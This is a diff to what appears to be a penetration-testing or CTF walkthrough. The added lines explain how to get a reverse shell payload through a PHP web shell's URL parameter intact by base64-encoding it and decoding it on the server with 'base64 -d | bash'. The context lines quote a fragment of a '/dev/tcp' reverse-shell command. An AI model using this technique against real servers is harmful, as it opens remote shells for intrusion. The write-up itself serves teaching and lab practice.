@@ -1092,6 +1092,10 @@ So a URL like `?c=bash -i >& /dev/tcp/...` would arrive at the server complete
 **Problem 2: Shell interpretation**
 
 Even if the URL survived intact, the shell on the server side might misinterpret the redirections (`>&`, `0>&1`) depending on how PHP's `system()` spawns the subprocess.
+
+**Base64 sidesteps both problems entirely** because the base64 character set only uses letters, numbers, `+`, `/`, and `=` — and `--data-urlencode` handles those safely. The encoded string travels as a clean, unambiguous blob, and the decoding (`base64 -d | bash`) happens entirely on the server side after it arrives, where the special characters are no longer inside a URL.
+
+Think of it like putting a letter in an envelope — the envelope (base64) travels safely through the postal system (HTTP), and only gets opened (decoded) once it reaches its destination (the server).
 <div align="center">
 <br>
 <br>
